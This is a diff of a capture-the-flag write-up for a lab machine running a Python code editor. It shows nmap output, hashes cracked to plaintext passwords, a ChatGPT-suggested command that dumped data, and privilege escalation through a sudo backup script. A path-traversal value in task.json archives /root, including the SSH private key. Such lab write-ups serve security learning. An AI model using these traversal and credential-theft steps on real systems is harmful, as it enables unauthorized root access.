@@ -1,12 +1,12 @@
-The first thing IP Address: 10.129.36.102
+The first thing IP Address: 10.129.194.232
 
 NMAP Enumeration:
 
 ```
-└──╼ [★]$ nmap -A -sC -sV  10.129.36.102
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 05:50 CDT
-Nmap scan report for 10.129.36.102
-Host is up (0.0092s latency).
+└─$ nmap -sC -sV 10.129.194.232
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 19:57 EDT
+Nmap scan report for 10.129.194.232
+Host is up (0.049s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
@@ -17,22 +17,15 @@ PORT     STATE SERVICE VERSION
 5000/tcp open  http    Gunicorn 20.0.4
 |_http-title: Python Code Editor
 |_http-server-header: gunicorn/20.0.4
-Device type: general purpose
-Running: Linux 5.X
-OS CPE: cpe:/o:linux:linux_kernel:5.0
-OS details: Linux 5.0
-Network Distance: 2 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-TRACEROUTE (using port 111/tcp)
-HOP RTT     ADDRESS
-1   8.91 ms 10.10.14.1
-2   9.15 ms 10.129.36.102
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds
 
 ```
+
+Information: Gunicorn 20.0.4 is a specific version of the Gunicorn Python WSGI HTTP server.
 
 From the enumeration, there is a 5000 port opened, which is http protocol. While opening it, there is a python interpreter. 
 
@@ -110,3 +103,183 @@ Interpreter Answer:
 ```
 Obfuscated Result of ev: 101 Ob Result of ex: 101  
 ```
+
+THOSE ARE TRIES ABOVE THAT LEAD NOWHERE
+
+There is another way, that AI helped me with: 
+![alt text](image-5.png)
+
+From ChatGPT, there is a command in python, which allows us to see the contents:
+![alt text](image-6.png)
+
+Using CrackStation URL  
+There hashes: 
+1. 759b74ce43947f5f4c91aeddc3e5bad3:development   (development:development)
+2. 3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster (martin:nafeelswordsmaster)
+
+Useful URL: https://linuxize.com/post/how-to-use-scp-command-to-securely-transfer-files/
+
+# Privilege Escalation
+
+Command: sudo -l
+
+```
+martin@code:~/backups$ sudo -l 
+Matching Defaults entries for martin on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User martin may run the following commands on localhost:
+    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
+
+```
+
+```
+martin@code:~/backups$ nano task.json 
+martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
+2025/07/08 13:43:25 🍀 backy 1.2
+2025/07/08 13:43:25 📋 Working with task.json ...
+2025/07/08 13:43:25 💤 Nothing to sync
+2025/07/08 13:43:25 📤 Archiving: [/home/app-production]
+2025/07/08 13:43:25 📥 To: /home/martin/backups ...
+2025/07/08 13:43:25 📦
+martin@code:~/backups$ ls
+code_home_app-production_2025_July.tar.bz2        task.json
+```
+
+```
+└─$ scp martin@10.129.231.240:/home/martin/backups/code_home_app-production_2025_July.tar.bz2 .
+martin@10.129.231.240's password: 
+code_home_app-production_2025_July.tar.bz2 100% 8612    31.4KB/s   00:00    
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ls
+burp                                              Downloads   Public
+code_home_app-production_2025_July.tar.bz2        GitDump     Sublist3r
+code_home_app-production_app_2024_August.tar.bz2  git-dumper  Templates
+compliance                                        home        Videos
+Desktop                                           Music
+Documents                                         Pictures
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ tar -xf code_home_app-production_2025_July.tar.bz2 
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ls
+burp                                              Downloads   Public
+code_home_app-production_2025_July.tar.bz2        GitDump     Sublist3r
+code_home_app-production_app_2024_August.tar.bz2  git-dumper  Templates
+compliance                                        home        Videos
+Desktop                                           Music
+Documents                                         Pictures
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ cd home   
+                                                                             
+┌──(kali㉿kali)-[~/home]
+└─$ ls
+app-production
+                                                                             
+┌──(kali㉿kali)-[~/home]
+└─$ cd app-production 
+                                                                             
+┌──(kali㉿kali)-[~/home/app-production]
+└─$ ls
+app  user.txt
+                                                                             
+┌──(kali㉿kali)-[~/home/app-production]
+└─$ cat user.txt
+```
+
+task.json
+
+```
+{
+  "destination": "/home/martin/",
+  "multiprocessing": true,
+  "verbose_log": true,
+  "directories_to_archive": [
+    "/home/....//root/"
+  ]
+}
+EOF
+```
+
+```
+martin@code:~$ sudo /usr/bin/backy.sh root-steal.json
+2025/07/08 15:38:05 🍀 backy 1.2
+2025/07/08 15:38:05 📋 Working with root-steal.json ...
+2025/07/08 15:38:05 💤 Nothing to sync
+2025/07/08 15:38:05 📤 Archiving: [/home/../root]
+2025/07/08 15:38:05 📥 To: /home/martin ...
+2025/07/08 15:38:05 📦
+tar: Removing leading `/home/../' from member names
+/home/../root/
+/home/../root/.local/
+/home/../root/.local/share/
+/home/../root/.local/share/nano/
+/home/../root/.local/share/nano/search_history
+/home/../root/.selected_editor
+/home/../root/.sqlite_history
+/home/../root/.profile
+/home/../root/scripts/
+/home/../root/scripts/cleanup.sh
+/home/../root/scripts/backups/
+/home/../root/scripts/backups/task.json
+/home/../root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
+/home/../root/scripts/database.db
+/home/../root/scripts/cleanup2.sh
+/home/../root/.python_history
+/home/../root/root.txt
+/home/../root/.cache/
+/home/../root/.cache/motd.legal-displayed
+/home/../root/.ssh/
+/home/../root/.ssh/id_rsa
+/home/../root/.ssh/authorized_keys
+/home/../root/.bash_history
+/home/../root/.bashrc
+martin@code:~$ ls
+backups  code_home_.._root_2025_July.tar.bz2  evil  root-steal.json
+```
+
+
+```
+martin@code:~$ mkdir root_dir
+martin@code:~$ tar -xvf code_home_.._root_2025_July.tar.bz2 -C /home/martin/root_dir
+root/
+root/.local/
+root/.local/share/
+root/.local/share/nano/
+root/.local/share/nano/search_history
+root/.selected_editor
+root/.sqlite_history
+root/.profile
+root/scripts/
+root/scripts/cleanup.sh
+root/scripts/backups/
+root/scripts/backups/task.json
+root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
+root/scripts/database.db
+root/scripts/cleanup2.sh
+root/.python_history
+root/root.txt
+root/.cache/
+root/.cache/motd.legal-displayed
+root/.ssh/
+root/.ssh/id_rsa
+root/.ssh/authorized_keys
+root/.bash_history
+root/.bashrc
+martin@code:~$ ls
+backups                              evil      root-steal.json
+code_home_.._root_2025_July.tar.bz2  root_dir
+martin@code:~$ cd root_dir/
+martin@code:~/root_dir$ ls
+root
+martin@code:~/root_dir$ cd root
+martin@code:~/root_dir/root$ ls
+root.txt  scripts
+martin@code:~/root_dir/root$ cat root.txt
+
+```
+
